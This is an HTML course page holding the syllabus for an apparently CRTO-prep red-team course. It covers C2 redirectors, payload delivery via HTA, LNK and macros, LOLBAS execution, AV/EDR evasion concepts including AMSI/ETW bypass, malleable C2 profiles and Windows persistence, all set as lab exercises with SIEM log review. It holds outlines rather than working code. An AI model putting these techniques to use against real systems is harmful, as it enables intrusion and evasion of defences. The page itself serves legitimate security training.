<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CRTO_phase1</title>
    <link rel="stylesheet" href="../style.css">
</head>
<body>
    <div class="container">
        
        <p><a href="../index.html">← Back to Course Catalog</a></p>

        <!-- Header Area -->
        <div class="course-header">
             <span class="category-tag">Category Placeholder</span> <!-- Add category data if available -->
            <h1>CRTO_phase1</h1>
            <p class="course-description">Description placeholder based on folder name</p> <!-- Add description data if available -->
            <div class="course-stats">
                <span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock h-5 w-5 mr-2 text-primary"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Duration Placeholder</span> <!-- Add duration data if available -->
                <span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-layers h-5 w-5 mr-2 text-primary"><path d="m12 18-6-6-4 4 10 10 10-10-4-4-6 6"/><path d="m12 18v4"/><path d="m2 12 10 10"/><path d="M12 18 22 8"/><path d="M6 6 10 2l10 10"/></svg> 8 Modules</span>
                <span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-zap h-5 w-5 mr-2 text-primary"><path d="M13 2v10h6l-7 10v-10H5z"/></svg> Difficulty Placeholder</span> <!-- Add difficulty data if available -->
            </div>
            <button>Start Learning</button>
        </div>

        <!-- Course Body: Tabs Navigation -->
        <!-- Added relative positioning to tabs-nav for potential dropdown positioning -->
        <div class="course-tabs-nav" style="position: relative;">
             <!-- Links use data attributes for JS handling and #hashes for history -->
             <a href="#overview" class="tab-link active" data-view="overview">Overview</a>
             <!-- Course Content tab now acts as a dropdown toggle -->
             <a href="#course-content" class="tab-link" data-view="course-content-toggle">Course Content</a>
             <a href="#discussion" class="tab-link disabled" data-view="discussion">Discussion (Static)</a>
        </div>
        <!-- The dropdown menu will be dynamically created and appended near the tabs nav -->


        <!-- Course Body: Content Area (Two-Column Layout) -->
        <!-- This grid structure is always present on course pages -->
        <div class="course-body-grid">
            <div class="main-content-column">
                 <!-- Content will be loaded here by JS -->
                 <!-- Initial content is Overview (handled by JS on load) -->
                 <!-- The 'card main-content-card' is now part of the fragment HTML itself -->
            </div>
            <div class="sidebar-column">
                 <!-- Sidebar content (only for overview) will be loaded here by JS -->
            </div>
        </div>

         <!-- Hidden container for content fragments and data -->
         <!-- Store fragments and raw data as JSON string for easier parsing in JS -->
        <script id="course-fragments" type="application/json">
        {
  "overview": "\n        <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n            <h2>About This Course</h2>\n            <div class=\"markdown-content\">\n                <p>Alright team, gather &#39;round! It&#39;s fantastic to embark on this journey together. Preparing for something like the CRTO exam isn&#39;t just about memorizing commands; it&#39;s about building a <em>mindset</em> and a <em>practical skillset</em> rooted in how real adversaries operate. This first part, &quot;Adversary Simulation Foundations,&quot; is exactly that – laying the concrete for everything else we&#39;ll do. We&#39;re not just learning techniques; we&#39;re learning <em>why</em> they work, <em>how</em> to build the infrastructure, and <em>how</em> to think like the operators we&#39;re simulating. Let&#39;s build this from the ground up!</p>\n<hr>\n<h2>CRTO Prep Part 1: Adversary Simulation Foundations</h2>\n<p><strong>Overall Course Objective:</strong> By the end of this course, learners will be able to set up a functional, monitored lab environment, deploy essential C2 infrastructure components, craft and deliver basic payloads, achieve initial execution and callback, apply foundational evasion techniques, manage implants using malleable profiles, and establish initial persistence, effectively creating a functional simulation of the initial access and foothold phase described in the course topic.</p>\n<hr>\n<h3>Module 1: The Adversary Simulation Mindset &amp; Planning</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will be able to articulate the differences between Red Teaming, Penetration Testing, and Threat Emulation, understand the key phases of an adversary simulation engagement, and begin drafting an engagement plan based on threat intelligence.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Defining Red Teaming vs. Penetration Testing vs. Threat Emulation: Goals, Scope, Methodologies.</li>\n<li>Why Adversary Simulation? Understanding the value proposition.</li>\n<li>Key Phases of an Adversary Simulation Engagement (Intelligence Gathering, Infrastructure, Initial Access, Execution, Persistence, Lateral Movement, Collection, Exfiltration, Impact, Clean-up).</li>\n<li>Engagement Design: Setting Realistic Objectives (Flags) and Scope.</li>\n<li>Rules of Engagement (ROE): Defining Boundaries and &quot;Get Out of Jail Free&quot; cards.</li>\n<li>Threat Actor Profiling: Using MITRE ATT&amp;CK, open-source intelligence (OSINT), and incident reports to understand TTPs.</li>\n<li>Translating TTPs into Simulation Actions.</li>\n<li>Legal and Ethical Considerations in Adversary Simulation.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Basic understanding of cybersecurity concepts.</li>\n<li>Familiarity with the concept of the Cyber Kill Chain or MITRE ATT&amp;CK (Introduction provided).</li>\n<li>Reading: Relevant sections of &quot;Red Team Operations&quot; or similar foundational books.</li>\n<li>Online: MITRE ATT&amp;CK framework website.</li>\n<li><strong>Case Study:</strong> Analyze a recent major breach (e.g., SolarWinds, Colonial Pipeline) focusing on the initial access and infrastructure used by the threat actor. Discuss how this could inform a simulation.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong><ul>\n<li><strong>Exercise 1.1: Concept Mapping:</strong> Create a diagram or written summary comparing and contrasting Red Teaming, Penetration Testing, and Threat Emulation based on goals, scope, and typical outcomes.</li>\n<li><strong>Project 1.2: Basic Engagement Plan Draft:</strong> Given a hypothetical scenario (e.g., simulate a specific APT group targeting a financial institution with a particular TTP focus), draft a high-level engagement plan outlining:<ul>\n<li>Engagement Objective(s)</li>\n<li>In-Scope Assets (conceptual)</li>\n<li>Out-of-Scope Activities</li>\n<li>Key TTPs to Emulate (based on a provided threat profile summary)</li>\n<li>Initial Access Vector(s) to explore (conceptual)</li>\n</ul>\n</li>\n<li><em>Contribution to Capstone:</em> This project establishes the <em>planning</em> phase, which is the conceptual start of any simulation built later in the course.</li>\n</ul>\n</li>\n</ul>\n<h3>Module 2: Building Your Adversary Simulation Lab</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will be able to deploy and configure a hybrid lab environment including Active Directory, target workstations, and foundational monitoring tools necessary to observe adversary simulation activities.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Lab Environment Design: Why a lab is crucial, choosing virtualization platforms (VMware, VirtualBox, Hyper-V).</li>\n<li>Setting up a Local Lab: Installing Virtual Machines (Windows Server, Windows Client).</li>\n<li>Configuring a Basic Active Directory Domain: Domain Controller setup, creating users and groups, joining client machines.</li>\n<li>Basic Network Configuration: Internal network setup, understanding NAT and Host-Only adapters.</li>\n<li>Introduction to Hybrid Labs (Azure/Cloud): Setting up basic cloud VMs, networking considerations (VPN/Peering concepts).</li>\n<li>Deploying and Configuring Sysmon: Understanding Sysmon rules and event IDs critical for detection.</li>\n<li>Setting up Basic Logging Infrastructure: Introduction to Splunk or ELK Stack (e.g., setting up a Splunk Free instance or ELK stack) and configuring Windows Event Forwarding/Sysmon log ingestion.</li>\n<li>Verifying Log Collection.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Basic understanding of networking fundamentals (IP addresses, subnets).</li>\n<li>Experience with virtualization software (installing VMs).</li>\n<li>Access to virtualization software (VMware Workstation/Fusion, VirtualBox, Hyper-V).</li>\n<li>Windows Server and Client ISOs (evaluation versions are fine).</li>\n<li>Sysmon installation files and configuration examples (Sysmon-config from SwiftOnSecurity is great).</li>\n<li>Splunk Free or ELK Stack installation guide.</li>\n<li>Azure/AWS Free Tier account (optional for hybrid).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong><ul>\n<li><strong>Project 2.1: Lab Environment Build:</strong> Set up the core lab environment:<ul>\n<li>Deploy a Windows Server VM and configure it as a Domain Controller for a new domain.</li>\n<li>Deploy at least one Windows 10/11 client VM and join it to the domain.</li>\n<li>Install and configure Sysmon on the client VM using a basic configuration file.</li>\n<li>Set up Splunk Free or ELK and configure log forwarding from the client VM (or manually import logs for testing).</li>\n<li>Verify that Sysmon logs are being ingested into your SIEM.</li>\n</ul>\n</li>\n<li><em>Contribution to Capstone:</em> This project builds the essential <em>target environment</em> and <em>monitoring layer</em> required for all subsequent practical modules.</li>\n</ul>\n</li>\n</ul>\n<h3>Module 3: Establishing Your C2 Infrastructure</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will be able to design and configure basic C2 infrastructure components including redirectors and payload hosting mechanisms.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Command and Control (C2) Concepts: Why C2 is needed, types of C2 channels (HTTP, HTTPS, DNS, SMB), characteristics of a good C2.</li>\n<li>Introduction to Redirectors: Purpose and benefits (obfuscation, protection).</li>\n<li>Configuring Redirectors:<ul>\n<li>Apache Mod_Rewrite Rules for Redirection.</li>\n<li>Nginx Configuration for Proxying/Redirection.</li>\n<li>Socat for Port Forwarding/Redirection.</li>\n</ul>\n</li>\n<li>Domain Fronting Principles (Conceptual): How it works and its limitations.</li>\n<li>Payload Hosting Techniques:<ul>\n<li>Setting up a basic HTTP/HTTPS server (Apache, Nginx, Python SimpleHTTPServer).</li>\n<li>Hosting payloads on SMB shares.</li>\n<li>Using WebDAV for payload delivery.</li>\n<li>Introduction to setting up simple phishing landing pages (Conceptual).</li>\n</ul>\n</li>\n<li>Introduction to DNS Tunneling (Conceptual Overview).</li>\n<li>Choosing Infrastructure Providers and Operational Security (OpSec) Considerations.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Basic Linux command line familiarity.</li>\n<li>Understanding of common network protocols (HTTP, HTTPS, DNS, SMB).</li>\n<li>Access to a Linux VM (e.g., Kali, Ubuntu Server) or cloud instance.</li>\n<li>Apache, Nginx, Socat installation guides/documentation.</li>\n<li>Understanding of DNS records (A, CNAME).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong><ul>\n<li><strong>Project 3.1: Deploy C2 Infrastructure:</strong><ul>\n<li>Set up a Linux VM (or use a cloud instance).</li>\n<li>Configure a basic redirector using either Apache or Nginx to forward traffic from a public IP/domain to an internal IP/port (simulating your C2 server).</li>\n<li>Set up a simple web server (Apache, Nginx, or Python) on a different port or directory to host a test file (your simulated payload).</li>\n<li><em>(Optional but Recommended):</em> Obtain a free domain name or use a dynamic DNS service for testing redirection.</li>\n</ul>\n</li>\n<li><em>Contribution to Capstone:</em> This project builds the essential <em>communication layer</em> that your implants will use, directly supporting the execution and management modules.</li>\n</ul>\n</li>\n</ul>\n<h3>Module 4: Crafting and Delivering Initial Payloads</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will be able to understand different payload types and common delivery vectors used to get code onto a target machine.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Payload Types: Stager vs. Stageless Payloads – Pros and Cons.</li>\n<li>Generating Basic Payloads (using tools like Metasploit&#39;s <code>msfvenom</code> for examples, or hinting at C2 framework specific generation).</li>\n<li>Common Delivery Methods:<ul>\n<li>HTA (HTML Applications) and <code>mshta.exe</code>.</li>\n<li>LNK (Shortcut Files).</li>\n<li>Macro-Enabled Documents (Word, Excel) - Introduction to VBA execution.</li>\n<li>ISO/IMG File Smuggling.</li>\n<li>Executable Payloads (.exe).</li>\n</ul>\n</li>\n<li>Introduction to .NET Assemblies as Payloads.</li>\n<li>Understanding DLL Payloads and <code>rundll32.exe</code>.</li>\n<li>Custom Launchers: Introduction to tools like Donut (converting .NET assemblies/PEs to shellcode).</li>\n<li>Encoding and Basic Obfuscation for Delivery (e.g., base64, simple XOR – deeper evasion in Module 6).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Familiarity with basic Windows command line.</li>\n<li>Understanding of file types (.exe, .dll, .hta, .lnk).</li>\n<li>Access to tools like <code>msfvenom</code> (part of Kali Linux).</li>\n<li>Documentation on HTA, LNK, VBA, Donut.</li>\n<li>Example code snippets for simple payloads/launchers.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong><ul>\n<li><strong>Project 4.1: Create and Host a Test Payload:</strong><ul>\n<li>Generate a simple stageless payload (e.g., a calc.exe launcher or a simple reverse shell pointing to your C2 redirector&#39;s IP/port from Module 3). <em>Note: A real reverse shell might be detected; focus on the delivery mechanism first.</em></li>\n<li>Package the payload using <em>one</em> delivery method covered (e.g., embed it in an HTA file, create an LNK file pointing to it, or simply have the raw executable).</li>\n<li>Host the packaged payload on the web server configured in Module 3.</li>\n</ul>\n</li>\n<li><em>Contribution to Capstone:</em> This project creates the <em>mechanism</em> for initial code execution, combining the C2 infrastructure with the payload itself.</li>\n</ul>\n</li>\n</ul>\n<h3>Module 5: Initial Execution and Callbacks</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will be able to execute a payload on a target machine using Living Off The Land Binaries/Scripts (LOLBAS) and establish a functional initial callback to their C2 infrastructure, observing the activity in their logging system.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Understanding Living Off The Land Binaries and Scripts (LOLBAS): Why attackers use them, common examples.</li>\n<li>Using <code>mshta.exe</code> for Execution (e.g., executing remote HTA files or VBScript/JScript).</li>\n<li>Using <code>rundll32.exe</code> for Executing DLL Entry Points.</li>\n<li>Using <code>regsvr32.exe</code> for Executing COM Scriptlets.</li>\n<li>Other Common LOLBAS for Execution (e.g., <code>powershell.exe</code>, <code>cscript.exe</code>, <code>wscript.exe</code>).</li>\n<li>Command Line Execution Techniques and Obfuscation (basic command line encoding/obfuscation).</li>\n<li>Understanding the Initial Callback Process: How the implant communicates with the C2.</li>\n<li>Monitoring Initial Execution and Callbacks in the SIEM (Splunk/ELK): Identifying relevant Sysmon and Windows Security Events.</li>\n<li>Troubleshooting Common Execution and Callback Issues.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Familiarity with the Windows command prompt (<code>cmd</code>) and PowerShell.</li>\n<li>LOLBAS project documentation (lolbas-project.github.io).</li>\n<li>Knowledge of basic network connectivity testing (<code>ping</code>, <code>curl</code>, <code>telnet</code>).</li>\n<li>Your lab environment (Module 2) and C2 infrastructure (Module 3) with hosted payload (Module 4).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong><ul>\n<li><strong>Project 5.1: Achieve Initial Execution &amp; Callback:</strong><ul>\n<li>From the Domain Controller or your attacker machine, attempt to execute the payload hosted in Module 4 on the target workstation VM using one of the LOLBAS techniques covered (e.g., <code>mshta</code> to execute your HTA, <code>rundll32</code> to execute your DLL).</li>\n<li>Verify that the payload successfully executed and attempted to connect back to your C2 redirector (observe network traffic if possible, or look for signs of execution).</li>\n<li>Check your SIEM (Splunk/ELK) for logs related to the execution (<code>mshta</code>, <code>rundll32</code> process creation) and potential network connections (Sysmon Event ID 3 - Network Connection). Analyze the logs to understand what activity was visible.</li>\n</ul>\n</li>\n<li><em>Contribution to Capstone:</em> This project achieves the critical <em>initial access</em> and <em>execution</em> phase, linking the lab, C2, payload, and monitoring together.</li>\n</ul>\n</li>\n</ul>\n<h3>Module 6: Foundational Evasion Techniques</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will understand basic detection vectors and apply fundamental techniques to evade common security controls like Antivirus (AV) and basic Endpoint Detection and Response (EDR) signatures.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>How AV/EDR Works (Signature vs. Heuristic vs. Behavioral Detection - simplified).</li>\n<li>Common Detection Vectors (File signatures, In-memory signatures, API hooking, Command line analysis, Network traffic).</li>\n<li>Basic Payload Obfuscation Techniques:<ul>\n<li>Simple Encoding (Base64, Hex).</li>\n<li>XOR and Simple Encryption.</li>\n<li>String Obfuscation within scripts/code.</li>\n</ul>\n</li>\n<li>Introduction to AMSI (Antimalware Scan Interface): How it works, common bypass concepts (high-level).</li>\n<li>Introduction to ETW (Event Tracing for Windows): How it&#39;s used by EDR, basic bypass concepts (high-level).</li>\n<li>Understanding Process Injection (Basics): Why it&#39;s used for evasion (hiding in legitimate processes), common techniques overview (e.g., remote threads, APC, process hollowing - focus on the <em>concept</em> and <em>purpose</em> for evasion).</li>\n<li>Testing Payloads against Basic Controls (using public scanners like VirusTotal <em>carefully</em>, or a lab AV instance).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Basic understanding of programming/scripting concepts (variables, strings).</li>\n<li>Familiarity with online encoding/decoding tools.</li>\n<li>Conceptual understanding of how security software works.</li>\n<li>Access to a test Antivirus solution in the lab (optional, but helpful).</li>\n<li>Documentation on AMSI/ETW (Microsoft Docs).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong><ul>\n<li><strong>Project 6.1: Obfuscate and Re-execute:</strong><ul>\n<li>Take the payload or execution command from Module 4/5.</li>\n<li>Apply a simple obfuscation technique (e.g., encode a critical string in the script/command, use a simple XOR on a small payload stub).</li>\n<li>Attempt to execute the obfuscated payload/command in the lab environment.</li>\n<li>Observe if the execution is successful and if the activity appears differently in the SIEM logs compared to the non-obfuscated version. Note any differences in detection (if using AV).</li>\n</ul>\n</li>\n<li><em>Contribution to Capstone:</em> This project adds the crucial <em>evasion</em> layer, making the initial access technique more realistic and resilient against basic defenses, building on the execution phase.</li>\n</ul>\n</li>\n</ul>\n<h3>Module 7: Implant Management with Malleable C2</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will understand the importance of C2 profile malleability and be able to configure basic options to control implant behavior and blend in with legitimate network traffic.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>The Need for Malleable C2 Profiles: Blending in, avoiding detection based on network signatures.</li>\n<li>Introduction to Malleable C2 Profile Concepts (using Cobalt Strike&#39;s profile language as a primary example, but discussing concepts applicable to other frameworks).</li>\n<li>Configuring Basic HTTP/S Options:<ul>\n<li>Setting User Agents.</li>\n<li>Customizing HTTP Headers (Host, Referer, Cookie, etc.).</li>\n<li>Modifying URIs and Request/Response Bodies.</li>\n</ul>\n</li>\n<li>Configuring Communication Timings:<ul>\n<li>Setting <code>sleep</code> (beacon interval).</li>\n<li>Implementing <code>jitter</code> (randomizing sleep).</li>\n<li>Using <code>killdate</code> (automatic implant expiration).</li>\n</ul>\n</li>\n<li>Understanding Sacrificial Processes: Spawning child processes for execution to hide the main implant process.</li>\n<li>Basic OpSec Considerations for C2 Communications.</li>\n<li>Analyzing C2 Traffic (using Wireshark or logs) to understand how profiles affect network visibility.</li>\n<li><em>(Note: This module focuses on profile <em>configuration</em> and <em>concepts</em>, not necessarily building a C2 framework from scratch)</em></li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Basic understanding of HTTP/HTTPS requests and responses.</li>\n<li>Familiarity with text configuration files.</li>\n<li>Access to a C2 framework that supports malleable profiles (Cobalt Strike trial, Mythic, or Sliver are good examples to <em>study</em> the profile concepts, even if not used for the full capstone build).</li>\n<li>Sample Malleable C2 profiles (e.g., from Cobalt Strike&#39;s GitHub repo).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong><ul>\n<li><strong>Project 7.1: Configure a Basic Malleable Profile:</strong><ul>\n<li>Obtain or write a simple malleable C2 profile configuration (using Cobalt Strike syntax as the teaching example).</li>\n<li>Modify the profile to:<ul>\n<li>Change the default User Agent string.</li>\n<li>Set a <code>sleep</code> time (e.g., 30 seconds) and add <code>jitter</code> (e.g., 20%).</li>\n<li>Set a <code>killdate</code>.</li>\n</ul>\n</li>\n<li>If using a framework that supports it, load this profile. If not, analyze the profile syntax and explain how it would affect the traffic generated by an implant using it.</li>\n<li><em>(If possible with your test framework):</em> Generate a test implant using this profile and get a callback in the lab. Observe the network traffic (e.g., using Wireshark on the C2 server or redirector) and compare it to default traffic (if you have a baseline).</li>\n</ul>\n</li>\n<li><em>Contribution to Capstone:</em> This project adds the <em>control</em> and <em>stealth</em> layer to the communication channel established in Module 3 and used in Module 5, making the simulation more realistic.</li>\n</ul>\n</li>\n</ul>\n<h3>Module 8: Initial Persistence Engineering</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will be able to identify common persistence locations on Windows systems and implement several basic techniques to maintain access after a reboot or user logout.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Understanding Persistence: Why it&#39;s necessary, different categories (Execution, High Privilege, etc.).</li>\n<li>Common Persistence Locations:<ul>\n<li>Startup Folders (<code>Startup</code>, <code>Common Startup</code>).</li>\n<li>Run and RunOnce Registry Keys.</li>\n<li>Scheduled Tasks: Creating tasks via <code>schtasks.exe</code> and PowerShell.</li>\n<li>Services: Introduction to creating/modifying services (conceptual).</li>\n</ul>\n</li>\n<li>Office Macro Persistence (Overview): How malicious macros can re-run code.</li>\n<li>Registry Hijacking (Basic Concepts): Targeting <code>AppInit_DLLs</code>, <code>IFEO</code>, etc.</li>\n<li>Abusing MSI/Installer Packages (Conceptual Overview).</li>\n<li>OpSec Considerations for Persistence: Choosing techniques that blend in.</li>\n<li>Detecting Persistence Mechanisms (Reviewing logs from Module 2 for relevant events like Scheduled Task creation, Registry modifications).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources or Prerequisites:</strong><ul>\n<li>Familiarity with the Windows Registry Editor (<code>regedit</code>).</li>\n<li>Basic understanding of Windows services and task scheduler.</li>\n<li>MITRE ATT&amp;CK Persistence tactics (TA0003).</li>\n<li>PowerShell scripting basics.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong><ul>\n<li><strong>Project 8.1: Implement Initial Persistence:</strong><ul>\n<li>Using the access gained in Module 5 (or by manually running a command on the target VM), implement <em>at least one</em> persistence mechanism from the module topics. This persistence mechanism should ideally attempt to re-establish a connection back to your C2 (e.g., a Scheduled Task that runs a script/payload pointing to your redirector).</li>\n<li>Examples: Create a Scheduled Task, add a key to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>, or place a LNK file in the Startup folder.</li>\n<li>Reboot the target workstation VM.</li>\n<li>Verify whether the persistence mechanism successfully executed and attempted to call back to your C2 infrastructure.</li>\n<li>Review the SIEM logs (Module 2) for evidence of the persistence mechanism being set up and executed.</li>\n</ul>\n</li>\n<li><em>Contribution to Capstone:</em> This project completes the initial foothold phase of the simulation, ensuring continued access, and integrates the execution and C2 components built in previous modules.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Capstone Project:</strong></p>\n<p>The capstone project for this foundational part is the successful execution of the combined module projects. Learners will demonstrate their ability to:</p>\n<ol>\n<li>Set up a basic Active Directory lab environment with logging enabled (Module 2).</li>\n<li>Deploy a basic C2 redirector and payload hosting mechanism (Module 3).</li>\n<li>Craft a basic payload designed for a specific delivery method (Module 4).</li>\n<li>Execute the payload on a target machine using a LOLBAS technique, achieving an initial callback to the C2 (Module 5).</li>\n<li>Apply a simple evasion technique to the payload or execution method (Module 6).</li>\n<li>Explain or demonstrate how a basic malleable C2 profile would be used to control the implant&#39;s communication (Module 7).</li>\n<li>Implement a basic persistence mechanism on the target machine that survives a reboot and attempts to re-establish access (Module 8).</li>\n<li>Analyze the logs generated in the SIEM (Splunk/ELK from Module 2) to identify the execution, communication, and persistence activities.</li>\n</ol>\n<p>This capstone is the culmination of building each piece of the &quot;Adversary Simulation Foundations&quot; from scratch, proving hands-on understanding of the initial access and foothold phases. It&#39;s your working model, your functional clone of the initial steps an adversary takes.</p>\n<hr>\n<p>There you have it! An 8-module path to building the foundational skills and infrastructure for realistic adversary simulation. We&#39;ll move from theory to practice, setting up our environment, understanding how to get code running stealthily, keeping that access, and seeing how our actions look from a defender&#39;s perspective via logging. This is just the beginning, but it&#39;s the most critical part – establishing the beachhead. Let&#39;s get building!</p>\n\n            </div>\n            <h2 class=\"module-list-heading\">Course Content</h2> <!-- Add heading for module list -->\n            <ul class=\"module-list\">\n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-1\" data-view=\"module-1\" data-module-order=\"1\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 1: module_1</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_1 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-2\" data-view=\"module-2\" data-module-order=\"2\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 2: module_2</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_2 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-3\" data-view=\"module-3\" data-module-order=\"3\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 3: module_3</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_3 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-4\" data-view=\"module-4\" data-module-order=\"4\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 4: module_4</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_4 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-5\" data-view=\"module-5\" data-module-order=\"5\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 5: module_5</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_5 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-6\" data-view=\"module-6\" data-module-order=\"6\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 6: module_6</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_6 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg 